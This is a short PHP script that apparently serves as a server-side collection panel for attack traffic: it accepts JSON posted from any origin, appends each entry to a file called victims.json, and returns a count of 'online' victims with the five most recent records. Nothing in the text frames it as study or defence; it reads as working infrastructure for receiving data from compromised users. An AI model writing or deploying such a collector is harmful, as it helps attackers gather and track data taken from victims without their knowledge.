<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

$victims = json_decode(file_get_contents('victims.json') ?: '[]', true);
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $victims[] = $data;
    file_put_contents('victims.json', json_encode($victims));
}

echo json_encode([
    'online' => count($victims),
    'victims' => array_slice($victims, -5)
]);
?>